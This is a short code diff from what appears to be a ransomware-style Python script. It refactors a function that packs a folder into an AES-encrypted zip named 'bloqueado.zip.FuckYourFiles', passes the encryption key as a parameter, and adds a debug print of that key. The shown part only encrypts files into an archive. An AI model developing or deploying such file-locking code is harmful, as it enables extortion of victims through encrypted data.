@@ -3,10 +3,8 @@ import sys
 
 import pyzipper
 
-from variavel import key
 
-
-def zip_folderPyzipper(folder_path, output_path):
+def zip_folderPyzipper(folder_path, output_path, cryptography_key):
     """Zip the contents of an entire folder (with that folder included
         in the archive). Empty subfolders will be included in the archive
         as well.
@@ -17,7 +15,8 @@ def zip_folderPyzipper(folder_path, output_path):
     try:
         zip_file = pyzipper.AESZipFile(
             'bloqueado.zip.FuckYourFiles', 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES)
-        zip_file.pwd = key.encode()
+        zip_file.pwd = cryptography_key
+        print('teste', cryptography_key)
         for root, folders, files in contents:
             # Include all subfolders, including empty ones.
             for folder_name in folders:
